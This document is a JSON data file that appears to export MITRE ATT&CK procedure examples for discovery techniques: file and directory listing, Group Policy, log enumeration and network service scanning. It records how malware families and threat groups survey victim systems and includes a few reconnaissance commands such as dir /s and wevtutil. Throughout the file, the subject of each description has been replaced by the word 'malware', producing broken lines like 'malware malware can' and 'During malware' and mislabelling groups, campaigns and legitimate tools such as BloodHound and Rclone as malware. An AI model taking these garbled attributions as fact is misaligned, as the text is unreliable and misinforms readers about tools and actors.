            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware has used the FindNextFile command as part of its file deletion process.[172]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has the ability to enumerate all files and directories on an infected system.[173][174][175]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has used the find command to search for specific files.[176]"
            },
            "S0437": {
                "ID": "S0437",
                "Name": "Kivars",
                "Description": "malware has the ability to list drives on the infected host.[177]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can obtain a list of directories.[178]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "A version of malware searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.[179]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\".[180]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[181][182][183][184]"
            },
            "G0077": {
                "ID": "G0077",
                "Name": "Leafminer",
                "Description": "malware used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.[185]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can list contents of drives and search for files.[186]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware can monitor for system upgrade events by checking for the presence of /tmp/data/root/dev.[187]"
            },
            "S1101": {
                "ID": "S1101",
                "Name": "LoFiSe",
                "Description": "malware can monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .rtf, .tif, .odt, .ods, .odp, .eml, and .msg.[188]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware can search for specific files on an infected host.[189]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can retrieve file listings from the victim machine.[190]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.[191][192]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware produces file listings in order to search for files to be exfiltrated.[193][194][195]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders.[196]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can search for files and directories.[197]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[198]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.[199]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware can parse the available drives and directories to determine which files to encrypt.[200]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.[201]"
            },
            "S0443": {
                "ID": "S0443",
                "Name": "MESSAGETAP",
                "Description": "malware checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.[202]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can recursively enumerate files in an operator-provided directory.[197][203]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.[204][205][206]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.[207]"
            },
            "S0051": {
                "ID": "S0051",
                "Name": "MiniDuke",
                "Description": "malware can enumerate local drives.[129]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.[208]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware searches for various filesystem paths to determine what banking applications are installed on the victim\u2019s machine.[209]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.[210]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware has a command to return a directory listing for a specified directory.[211]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"[212]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.[213]"
            },
            "S0272": {
                "ID": "S0272",
                "Name": "NDiskMonitor",
                "Description": "malware can obtain a list of all files and directories as well as logical drives.[39]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware can list files and directories on a compromised host.[214]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "malware allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.[37]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware has the ability to search for files on the compromised host.[215]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system.[216]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files.[217]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware has the ability to enumerate directory content.[218][188]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can browse file systems using a file manager module.[219]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware searches for files ending with dozens of different file extensions prior to encryption.[220]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware has the ability to recursively enumerate files on an infected endpoint.[221]"
            },
            "S0346": {
                "ID": "S0346",
                "Name": "OceanSalt",
                "Description": "malware can extract drive information from the endpoint and search files on the system.[222]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can collect information on the Windows directory and searches for compressed RAR files on the host.[223][224][225]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware has used DriveLetterView to enumerate drive information.[226]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used dir c:\\\\ to search for files.[227]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.[228]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors used a malicious DLL to search for files with specific keywords.[229]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors gathered a recursive directory listing to find files and directories of interest.[230]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can gather victim drive information.[231]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware has used the command appDir=\"$(dirname $(dirname \"$currentDir\"))\" and $(dirname \"$(pwd -P)\") to construct installation paths.[232][233]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can search for specific file extensions, including zipped files.[234]"
            },
            "S0072": {
                "ID": "S0072",
                "Name": "OwaAuth",
                "Description": "malware has a command to list its directory and logical drives.[151]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware has the ability to list files and file characteristics including extension, size, ownership, and permissions.[235]"
            },
            "S1109": {
                "ID": "S1109",
                "Name": "PACEMAKER",
                "Description": "malware can parse /proc/\"process_name\"/cmdline to look for the string dswsd within the command line.[236]"
            },
            "S0208": {
                "ID": "S0208",
                "Name": "Pasam",
                "Description": "malware creates a backdoor through which remote attackers can retrieve lists of files.[237]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "A malware payload has searched all fixed drives on the victim for files matching a specified list of extensions.[238][39]"
            },
            "S1102": {
                "ID": "S1102",
                "Name": "Pcexter",
                "Description": "malware has the ability to search for files in specified directories.[188]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can use the command code do_vslist to send file names, size, and status to C2.[239]"
            },
            "S0643": {
                "ID": "S0643",
                "Name": "Peppy",
                "Description": "malware can identify specific files for exfiltration.[93]"
            },
            "S0048": {
                "ID": "S0048",
                "Name": "PinchDuke",
                "Description": "malware searches for files created within a certain timeframe and whose file extension matches a predefined list.[143]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can enumerate storage volumes and folder contents of a compromised host.[240]"
            },
            "S0124": {
                "ID": "S0124",
                "Name": "Pisloader",
                "Description": "malware has commands to list drives on the victim machine and to list file information for a given directory.[241]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to list drives and files on the compromised host.[177][242]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module to enumerate drives and find files recursively.[243][244]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has the ability to list files upon receiving the ls command from C2.[245]"
            },
            "S0216": {
                "ID": "S0216",
                "Name": "POORAIM",
                "Description": "malware can conduct file browsing.[89]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can enumerate files on the local file system and includes a module for enumerating recently accessed files.[246]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.[247]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may enumerate user directories on a victim.[248]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.[249]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.[250]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware lists files in directories.[182]"
            },
            "S0078": {
                "ID": "S0078",
                "Name": "Psylo",
                "Description": "malware has commands to enumerate all storage devices and to find all files that start with a particular string.[210]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware identifies files matching certain file extension and copies them to subdirectories it created.[251]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can walk through directories and recursively search for strings in files.[252]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can identify whether it has been run previously on a host by checking for a specified folder.[253]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z.[254]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can use a file exfiltration tool to collect recently changed files with specific extensions.[214]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can collect directory and file lists.[255][256]"
            },
            "S0055": {
                "ID": "S0055",
                "Name": "RARSTONE",
                "Description": "malware obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.[257]"
            },
            "S1040": {
                "ID": "S1040",
                "Name": "Rclone",
                "Description": "malware can list files and directories with the ls, lsd, and lsl commands.[258]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can enumerate and search for files and directories.[259][75]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware can search for files on the infected machine.[260]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware searches for files on the system. [261]"
            },
            "S0592": {
                "ID": "S0592",
                "Name": "RemoteUtilities",
                "Description": "malware can enumerate files and directories on a target machine.[262]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware is capable of listing contents of folders on the victim. malware also searches for custom network encryption software on victims.[263][264][265]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware has the ability to identify specific files and directories that are not to be encrypted.[266][267][268][269][270][271]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. malware can enumerate the compilation timestamp of Windows executable files.[272]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware has the ability to gather a list of files and directories on the infected system.[273][274][275]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware automatically searches for files on local drives based on a predefined list of file extensions.[276]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can identify specific files and directories to exclude from the encryption process.[277][278][279]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can check for specific files and directories associated with virtualization and malware analysis.[280]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has enumerated files and folders on all mounted drives.[281]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can search a compromised host for specific files.[234]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can use a specific module for file enumeration.[218]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has enumerated files on a compromised host.[220][282]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware Spider enumerates a target organization for files and directories of interest, including source code.[283][284]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to get directory listings or drive information on a compromised host.[285]"
            },
            "S0345": {
                "ID": "S0345",
                "Name": "Seasalt",
                "Description": "malware has the capability to identify the drive type on a victim.[222]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either %USERPROFILE%\\Recent (Windows XP) or %APPDATA%\\Microsoft\\Windows\\Recent (newer Windows versions) .[217]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware can list directories.[286]"
            },
            "S0063": {
                "ID": "S0063",
                "Name": "SHOTPUT",
                "Description": "malware has a command to obtain a directory listing.[287]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has the ability to search for specific files.[288]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used malware to collect information on files and directories.[289]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware has several modules, such as ls.py, pwd.py, and recentFiles.py, to enumerate directories and files.[290]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware searches for the Kubernetes config file and other related files using a regular expression.[291]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware has checked for the existence of specific files including /usr/sbin/setenforce and  /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process. [292]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can enumerate files on a target system.[293]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware can enumerate files and directories.[294]"
            },
            "S0226": {
                "ID": "S0226",
                "Name": "Smoke Loader",
                "Description": "malware recursively searches through directories for files.[295]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.[296]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can execute enum to enumerate files in storage on a compromised system.[297]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware has the ability to list directories.[298]"
            },
            "S0157": {
                "ID": "S0157",
                "Name": "SOUNDBITE",
                "Description": "malware is capable of enumerating and manipulating files and directories.[299]"
            },
            "G0054": {
                "ID": "G0054",
                "Name": "Sowbug",
                "Description": "malware identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.[300]"
            },
            "S0035": {
                "ID": "S0035",
                "Name": "SPACESHIP",
                "Description": "malware identifies files and directories for collection by searching for specific file extensions or file modification time.[37]"
            },
            "S0142": {
                "ID": "S0142",
                "Name": "StreamEx",
                "Description": "malware has the ability to enumerate drive types.[301]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can enumerate files on a compromised host.[302]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can parse the hard drive on a compromised host to identify specific file extensions.[303]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware uses a driver to scan for specific filesystem driver objects.[304]"
            },
            "S1042": {
                "ID": "S1042",
                "Name": "SUGARDUMP",
                "Description": "malware can search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the string Profile in its name.[305]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware had commands to enumerate files and directories.[306][307]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware enumerated the Orion software Visual Studio solution directory path.[308]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware checks its directory location in an attempt to avoid launching in a sandbox.[309][310]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can search files on a compromised host.[311][312]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can search for specific files.[313]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can use DirectoryList to enumerate files in a specified directory.[314]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to index files from drives, user profiles, and removable drives.[315]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used a script that checks /proc/*/environ for environment variables related to AWS.[316]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can obtain file and directory information.[317]"
            },
            "S0131": {
                "ID": "S0131",
                "Name": "TINYTYPHON",
                "Description": "malware searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.[26]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension.[188]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.[318][319]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can enumerate files and directories on a compromised host.[320]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has monitored files' modified time.[321]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to discover drive information on the infected host.[322]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can search for specific files and list directories.[323]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.[126][324] malware RPC backdoors have also searched for files matching the lPH*.dll pattern.[325]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "malware can search directories for files on the victim\u2019s machine.[326]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware has the capability to gather the victim's current directory.[327]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can search for specific files on a compromised system.[328]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can detect the victim's file or folder list.[321]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "malware searches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names.[329][330]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can list directories on a victim.[331]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.[332][333]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can enumerate directories on a compromise host.[334]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can enumerate files and directories just prior to encryption.[335]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can locate files based on hardcoded file extensions.[336][337][338][339]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has used a script to check for the presence of files created by OpenSSH backdoors.[340]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware has the ability to enumerate the users home directory and the path to its own application bundle.[341][342]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can enumerate files and directories.[89]"
            },
            "S0059": {
                "ID": "S0059",
                "Name": "WinMM",
                "Description": "malware sets a WH_CBT Windows hook to search for and capture files on the victim.[343]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "malware can check for the presence of specific files prior to moving to the next phase of execution.[344]"
            },
            "G0044": {
                "ID": "G0044",
                "Name": "Winnti Group",
                "Description": "malware has used a program named ff.exe to search for specific documents on compromised hosts.[345]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.[346]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[347] malware contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.[347]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware has used mdfind to enumerate a list of apps known to grant screen sharing permissions.[348]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware gathers information on victim\u2019s drives and has a plugin for document listing.[349]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. malware also runs the echo %APPDATA% command to list the contents of the directory.[350][351][352] malware can obtain the current execution path as well as perform drive enumeration.[353][354]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware searches for specific directories on the victim\u2019s machine.[355]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.[356]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has the ability to enumerate files and drives.[208]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware can enumerate files on a compromised host.[357]"
            },
            "S0350": {
                "ID": "S0350",
                "Name": "zwShell",
                "Description": "malware can browse the file system.[216]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has a command to open a file manager and explorer on the system.[358]"
            }
        }
    },
    "T1615": {
        "ttp_name": "Group Policy Discovery",
        "ttp_id": "T1615",
        "href": "/techniques/T1615",
        "tactic": "Discovery",
        "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Adversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings.[3][4] Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.",
        "Procedure": {
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware has the ability to collect local admin information via GPO.[5]"
            },
            "S0082": {
                "ID": "S0082",
                "Name": "Emissary",
                "Description": "malware has the capability to execute gpresult.[6]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware includes various modules for enumerating Group Policy.[4]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover Group Policy details using the gpresult command.[7]"
            }
        }
    },
    "T1654": {
        "ttp_name": "Log Enumeration",
        "ttp_id": "T1654",
        "href": "/techniques/T1654",
        "tactic": "Discovery",
        "description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).Host binaries may be leveraged to collect system logs. Examples include using wevtutil.exe or PowerShell on Windows to access and/or export security event information.[1][2] In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s CollectGuestLogs.exe to collect security logs from cloud hosted infrastructure.[3]Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.",
        "Procedure": {
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.[4]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can collect CloudTrail event histories and CloudWatch logs.[5]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons.[6]"
            }
        }
    },
    "T1046": {
        "ttp_name": "Network Service Discovery",
        "ttp_id": "T1046",
        "href": "/techniques/T1046",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.[1] Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.[2][3]",
        "Procedure": {
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.[4]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.[5][6]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used a malware variant called WIDETONE to conduct port scans on specified subnets.[7]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware can use a network scanning module to identify ICS-related ports.[8]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.[9]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can check for open ports on a computer by establishing a TCP connection.[10]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has conducted port scans on a host.[11]"
            },
            "G0098": {
                "ID": "G0098",
                "Name": "BlackTech",
